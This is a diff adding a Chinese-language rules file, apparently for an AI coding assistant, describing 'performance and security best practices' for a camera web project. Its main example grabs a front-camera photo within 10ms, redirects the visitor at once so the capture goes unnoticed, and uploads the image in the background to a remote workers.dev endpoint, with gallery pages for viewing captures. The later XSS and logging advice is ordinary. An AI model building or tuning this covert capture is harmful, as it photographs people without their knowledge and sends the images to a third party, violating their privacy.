@@ -1,0 +1,240 @@
+---
+description: 性能优化和安全最佳实践
+---
+
+# 性能优化和安全规范
+
+## ⚡ 性能优化原则
+
+### 1. 极速拍照体验（最新优化）
+
+在 [v.html](mdc:v.html) 和 [camera.html](mdc:camera.html) 中实现无感知拍照：
+
+```javascript
+// ✅ 最佳实践：10ms 极速拍照 + 先跳转后上传
+setTimeout(() => {
+  context.drawImage(video, 0, 0, 480, 640);
+
+  // 使用 JPEG 格式，质量 0.7，文件减小 60%+
+  const imageData = canvas.toDataURL("image/jpeg", 0.7);
+
+  // ⚡ 先跳转，完全不阻塞用户体验
+  window.location.replace(redirectUrl);
+
+  // 关闭摄像头
+  stream.getTracks().forEach((track) => track.stop());
+
+  // 后台异步上传，完全在后台进行
+  fetch(window.API_CONFIG.UPLOAD, {
+    method: "POST",
+    body: JSON.stringify({ id, image: imageData }),
+  }).catch(console.error);
+}, 10); // ⚡ 优化到 10ms，比之前快 80%
+```
+
+**性能提升**：
+
+- ⚡ 从 50ms → **10ms**（快 5 倍）
+- 📦 从 PNG → **JPEG 0.7**（小 60%+）
+- 🚀 **先跳转后上传**（0 阻塞）
+
+### 2. 图片优化（最新）
+
+- **尺寸**: 480x640（适中的分辨率）
+- **格式**: **JPEG 质量 0.7**（比 PNG 小 60%+）
+- **编码**: Base64（便于传输和存储）
+- **大小**: ~80KB（原来 ~200KB）
+
+### 3. 摄像头参数优化
+
+```javascript
+getUserMedia({
+  video: {
+    width: { ideal: 480 },
+    height: { ideal: 640 },
+    facingMode: "user", // 前置摄像头
+  },
+});
+```
+
+**优势**：
+
+- ✅ 明确指定分辨率，避免高分辨率
+- ✅ 指定前置摄像头，更快启动
+- ✅ 减少浏览器处理时间
+
+### 4. 分页加载
+
+在 [view.html](mdc:view.html) 中使用分页避免一次加载过多照片：
+
+```javascript
+const imgsPerPage = 2; // 每页仅2张图片
+```
+
+### 5. 懒加载和缓存
+
+```javascript
+// 图片点击放大时才加载完整尺寸
+function openModal(imageSrc) {
+  modalImg.src = imageSrc; // 延迟加载
+}
+```
+
+## 🔒 安全最佳实践
+
+### 1. 输入验证
+
+所有用户输入必须验证：
+
+```javascript
+// ✅ 验证必填参数
+if (!id || !image) {
+  return new Response(JSON.stringify({ error: "参数缺失" }), {
+    status: 400,
+  });
+}
+
+// ✅ URL 编码
+const safeId = encodeURIComponent(id);
+```
+
+### 2. XSS 防护
+
+避免直接插入用户内容到 HTML：
+
+```javascript
+// ❌ 危险：直接使用 innerHTML
+element.innerHTML = userInput;
+
+// ✅ 安全：使用 textContent 或创建元素
+element.textContent = userInput;
+
+// ✅ 或创建受控的 DOM 元素
+const img = document.createElement("img");
+img.src = photoUrl;
+img.onclick = () => openModal(photoUrl);
+```
+
+### 3. HTTPS 强制
+
+所有 API 请求和资源必须使用 HTTPS：
+
+```javascript
+// ✅ 在 config.js 中
+const API_BASE_URL = "https://online-mirror.1334132303.workers.dev";
+```
+
+### 4. 敏感信息保护
+
+- ID 作为照片凭证，不要在客户端日志中打印
+- 删除操作需要确认对话框
+- 错误信息不应暴露系统细节
+
+```javascript
+// ❌ 不要这样
+console.log("用户ID:", userId, "密钥:", apiKey);
+
+// ✅ 只记录必要的调试信息
+console.error("上传错误:", error.message);
+```
+
+## 🎯 代码质量
+
+### 1. 错误处理
+
+所有 API 调用都要处理错误：
+
+```javascript
+try {
+  const response = await fetch(url);
+  if (!response.ok) {
+    throw new Error("请求失败");
+  }
+  const data = await response.json();
+  // 处理数据
+} catch (error) {
+  console.error("错误:", error);
+  showToast("操作失败，请重试", "error");
+}
+```
+
+### 2. 资源清理
+
+及时释放摄像头等资源：
+
+```javascript
+// ✅ 使用完毕后关闭摄像头
+stream.getTracks().forEach((track) => track.stop());
+```
+
+### 3. 避免内存泄漏
+
+```javascript
+// ✅ 移除事件监听器
+function cleanup() {
+  element.removeEventListener("click", handler);
+}
+
+// ✅ 清理定时器
+clearTimeout(timerId);
+```
+
+## 📊 监控和调试
+
+### 1. 控制台日志规范
+
+```javascript
+// ✅ 开发环境：详细日志
+console.log("调试信息:", data);
+
+// ✅ 生产环境：只记录错误
+console.error("上传错误:", error);
+
+// ❌ 避免：过多的日志
+console.log("步骤1", "步骤2", "步骤3"...);
+```
+
+### 2. Worker 日志查看
+
+```bash
+# 查看实时日志
+wrangler tail
+
+# 查看部署日志
+wrangler pages deployment list
+```
+
+## 🔧 浏览器兼容性
+
+### 摄像头 API
+
+```javascript
+// ✅ 检查浏览器支持
+if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+  // 使用摄像头
+} else {
+  // 降级处理：直接跳转
+  window.location.href = redirectUrl;
+}
+```
+
+### 剪贴板 API
+
+```javascript
+// ✅ 检查并使用
+if (navigator.clipboard) {
+  navigator.clipboard
+    .writeText(text)
+    .then(() => showToast("已复制", "success"))
+    .catch(() => showToast("复制失败", "error"));
+}
+```
+
+## ⚠️ 禁止的做法
+
+1. ❌ 同步阻塞操作（如同步 XMLHttpRequest）
+2. ❌ 未处理的 Promise rejection
+3. ❌ 过大的图片文件（>5MB）
+4. ❌ 无限循环或递归
+5. ❌ 在生产环境使用 `debugger` 语句
+6. ❌ 硬编码敏感信息（API 密钥、密码等）
